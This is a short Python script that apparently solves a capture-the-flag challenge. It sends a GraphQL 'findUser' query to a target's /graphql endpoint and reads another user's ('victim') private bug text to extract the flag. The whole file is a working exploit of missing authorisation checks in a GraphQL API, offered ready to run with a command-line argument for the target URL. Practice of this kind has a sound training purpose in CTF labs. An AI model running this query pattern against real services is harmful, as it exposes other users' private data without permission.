"""
Graphql query for fetching the flag. In the current CTF, the flag is present
in the Bug_ object for user `victim`.
"""

import argparse

# third party lib
import requests


def parser_():
    parser = argparse.ArgumentParser(
        description="Query graphql endpoint and fetch Flag",
    )
    parser.add_argument("url", metavar="url")
    parser.add_argument(
        "-u",
        "--user",
        metavar="user",
        help="Fetch text for user (default: %(default)s)",
        default="victim",
    )

    args = parser.parse_args()
    return args


def get_flag(url: str, user: str) -> str:
    payload = f"""
        {{
            findUser(username: \"{user}\") {{
                username
                bugs {{
                    edges {{
                        node {{
                            text
                        }} 
                    }} 
                }} 
            }} 
        }}
    """
    url = "{url}/graphql".format(url=url)
    r = requests.post(url, json={"query": payload})
    r.raise_for_status()
    flag = r.json()["data"]["findUser"]["bugs"]["edges"][0]["node"]["text"]
    return flag


if __name__ == "__main__":
    args = parser_()
    print("Flag:", get_flag(args.url, args.user))
